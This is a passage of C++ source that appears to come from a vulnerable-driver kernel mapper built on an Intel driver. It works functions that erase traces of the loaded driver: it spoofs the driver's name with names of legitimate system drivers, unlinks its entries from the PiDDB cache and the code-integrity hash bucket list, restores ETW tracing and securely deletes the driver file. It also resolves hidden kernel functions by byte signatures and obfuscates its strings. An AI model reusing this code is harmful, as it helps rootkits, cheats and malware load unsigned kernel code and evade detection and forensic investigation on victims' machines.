					bool safe_to_free = false;
					if (Magic == 0xDA18 && MpFreeDriverInfoEx != 0) {
						IMAGE_DOS_HEADER dos = { 0 };
						if (ReadMemory(WdFilter, &dos, sizeof(dos)) && dos.e_magic == IMAGE_DOS_SIGNATURE) {
							IMAGE_NT_HEADERS64 nt = { 0 };
							if (ReadMemory(WdFilter + dos.e_lfanew, &nt, sizeof(nt)) && nt.Signature == IMAGE_NT_SIGNATURE) {
								uintptr_t imgLo = WdFilter;
								uintptr_t imgHi = WdFilter + nt.OptionalHeader.SizeOfImage;
								if (MpFreeDriverInfoEx > imgLo && MpFreeDriverInfoEx < imgHi) {
									uint8_t prologue = 0;
									if (ReadMemory(MpFreeDriverInfoEx, &prologue, 1)) {
										if (prologue == 0x40 || prologue == 0x48 || prologue == 0x55 ||
											prologue == 0x53 || prologue == 0x56 || prologue == 0x57 ||
											prologue == 0x4C || prologue == 0xE9 || prologue == 0x44 ||
											prologue == 0x41)
											safe_to_free = true;
									}
								}
							}
						}
					}

					if (safe_to_free) {
						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					return true;
				}
			}
		}
	}
	return false;
}

NTSTATUS intel_driver::Unload() {
	RestoreKernelEtwTi();

	runtimeReady = false;
	kernel_MmGetPhysicalAddress = 0;
	ntoskrnlPhysBase = 0;
	ntoskrnlImageSize = 0;

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
		CloseHandle(hDevice);
	hDevice = 0;

	auto status = service::StopAndRemove(GetDriverNameW());

	std::wstring driver_path = GetDriverPath();
	if (!driver_path.empty())
		SecureDeleteFile(driver_path);

	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
}

uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000)
				return 0;

			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;
	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == hDevice)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;
	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object)
		return false;

	uint64_t driver_object = 0;
	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object)
		return false;

	uint64_t driver_section = 0;
	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section)
		return false;

	UNICODE_STRING us_driver_base_dll_name = { 0 };
	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0 || !us_driver_base_dll_name.Buffer)
		return false;

	static const wchar_t* shortSpoofs[] = {
		L"cng.sys",     L"mup.sys",     L"afd.sys",     L"hal.sys",
		L"ndis.sys",    L"null.sys",    L"udfs.sys",    L"http.sys",
		L"beep.sys",    L"ksecdd.sys",  L"hidusb.sys",  L"acpiex.sys",
		L"wmiacpi.sys", L"monitor.sys", L"intelppm.sys"
	};

	USHORT maxFit = us_driver_base_dll_name.MaximumLength;
	const wchar_t* spoofName = nullptr;
	USHORT spoofLen = 0;

	for (int tries = 0; tries < 16; ++tries) {
		const wchar_t* cand = shortSpoofs[kdmUtils::CryptoRand32() % _countof(shortSpoofs)];
		USHORT candLen = (USHORT)(wcslen(cand) * sizeof(wchar_t));
		if (candLen + (USHORT)sizeof(wchar_t) <= maxFit) {
			spoofName = cand;
			spoofLen = candLen;
			break;
		}
	}

	if (!spoofName) {
		for (size_t i = 0; i < _countof(shortSpoofs); ++i) {
			USHORT candLen = (USHORT)(wcslen(shortSpoofs[i]) * sizeof(wchar_t));
			if (candLen + (USHORT)sizeof(wchar_t) <= maxFit) {
				spoofName = shortSpoofs[i];
				spoofLen = candLen;
				break;
			}
		}
	}

	if (!spoofName)
		return false;

	uint64_t bufAddr = (uint64_t)us_driver_base_dll_name.Buffer;
	if (!WriteMemory(bufAddr, (void*)spoofName, spoofLen + sizeof(wchar_t)))
		return false;

	us_driver_base_dll_name.Length = spoofLen;
	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	return true;
}

PVOID intel_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
		return nullptr;
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAcquireResourceExclusiveLite"));
	if (!kernel_ExAcquireResourceExclusiveLite)
		return 0;

	BOOLEAN out;
	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExReleaseResourceLite"));
	if (!kernel_ExReleaseResourceLite)
		return false;

	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("RtlDeleteElementGenericTableAvl"));
	if (!kernel_RtlDeleteElementGenericTableAvl)
		return false;

	bool out;
	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("RtlLookupElementGenericTableAvl"));
	if (!kernel_RtlLookupElementGenericTableAvl)
		return nullptr;

	PVOID out;
	if (!CallKernelFunction(&out, kernel_RtlLookupElementGenericTableAvl, Table, Buffer))
		return 0;
	return out;
}

nt::PiDDBCacheEntry* intel_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
	nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

bool intel_driver::ClearPiDDBCacheTable() {
	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");

	if (PiDDBLockPtr == NULL) {
		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
			if (PiDDBLockPtr == NULL)
				return false;
			PiDDBLockPtr += 19;
		}
		else {
			PiDDBLockPtr += 16;
		}
	}
	else {
		PiDDBLockPtr += 28;
	}

	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
		if (PiDDBCacheTablePtr == NULL)
			return false;
		PiDDBCacheTablePtr += 2;
	}

	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);

	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true))
		return false;

	auto n = GetDriverNameW();
	auto timestamp = intel_driver::loadedDriverTimestamp;

	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	PLIST_ENTRY prev;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	ExReleaseResourceLite(PiDDBLock);
	return true;
}

uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress)
		return 0;

	if (dwLen > 1024 * 1024 * 1024)
		return 0;

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen))
		return 0;

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
	if (result <= 0)
		return 0;

	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000))
		return 0;

	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize)
		return 0;

	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList() {
	uint64_t ci = kdmUtils::GetKernelModuleAddress(ENC("ci.dll"));
	if (!ci)
		return false;

	auto sig = FindPatternInSectionAtKernel("PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig)
		return false;

	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2)
		return false;

	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
		return false;

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true))
		return false;

	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
	nt::HashBucketEntry* entry = 0;
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
		ExReleaseResourceLite(g_HashCacheLock);
		return false;
	}
	if (!entry) {
		ExReleaseResourceLite(g_HashCacheLock);
		return true;
	}

	std::wstring wdname = GetDriverNameW();

	while (entry) {
		USHORT wsNameLen = 0;
		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen))) {
			ExReleaseResourceLite(g_HashCacheLock);
			return false;
		}

		if (wsNameLen > 0 && wsNameLen < 0x1000) {
			wchar_t* wsNamePtr = 0;
			if (ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) && wsNamePtr) {
				auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
				if (ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
					wsName[wsNameLen / 2] = 0;

					if (std::wstring(wsName.get()).find(wdname) != std::wstring::npos) {
						nt::HashBucketEntry* Next = 0;
						if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
							ExReleaseResourceLite(g_HashCacheLock);
							return false;
						}

						if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
							ExReleaseResourceLite(g_HashCacheLock);
							return false;
						}

						if (!FreePool((uintptr_t)entry)) {
							ExReleaseResourceLite(g_HashCacheLock);
							return false;
						}

						ExReleaseResourceLite(g_HashCacheLock);
						return true;
					}
				}
			}
		}

		prev = entry;
		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
			ExReleaseResourceLite(g_HashCacheLock);
			return false;
		}
	}

	ExReleaseResourceLite(g_HashCacheLock);
	return false;
}

uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
	if (!kernel_ExAllocatePool)
		return 0;

	uint64_t allocated_pool = 0;
	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();
	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, randomTag))
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExFreePool"));
	if (!kernel_ExFreePool)
		return 0;

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
{
	uint64_t allocated_pages{};
	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel((char*)".text", intel_driver::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx)
			return 0;

		kernel_MmAllocateIndependentPagesEx += 8;
		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx)
			return 0;
	}

	if (!intel_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");

			if (!kernel_MmFreeIndependentPages)
				return false;

			kernel_MmFreeIndependentPages += 9;
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages)
			return false;
	}

	uint64_t result{};
	return intel_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
		return FALSE;

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {
			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");
			if (!kernel_MmSetPageProtection)
				return FALSE;
			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection)
			return FALSE;
	}

	BOOLEAN set_prot_status{};
	if (!intel_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}
